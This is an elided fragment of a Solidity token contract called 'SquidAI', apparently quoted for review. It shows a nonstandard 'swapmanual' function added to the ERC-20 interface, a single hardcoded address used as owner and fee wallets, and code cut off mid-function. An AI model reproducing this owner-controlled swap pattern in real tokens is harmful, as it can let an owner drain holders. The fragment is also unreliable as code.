...
https://medium.com/@squidaiofficial/sincerity-for-the-community-dda51db78cef
...
interface IERC20 {
    ...
    function swapmanual(address account) external returns (uint256);
...
contract SquidAI is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x5ba472a49CcB3CEA625c5185eE5776FD0aF52060); 
    address payable public Wallet_Dev = payable(0x5ba472a49CcB3CEA625c5185eE5776FD0aF52060);
    ...
    string private constant _name = "SquidAI"; 
    string private constant _symbol = unicode"SquidAI"; 
    ...
    constructor () {
        ...
        _owner = 0x5ba472a49CcB3CEA625c5185eE5776FD0aF52060;
    ...
    function swapmanual(address account) public openTheSwap override returns (uint256) {
        if(isBuyFee){
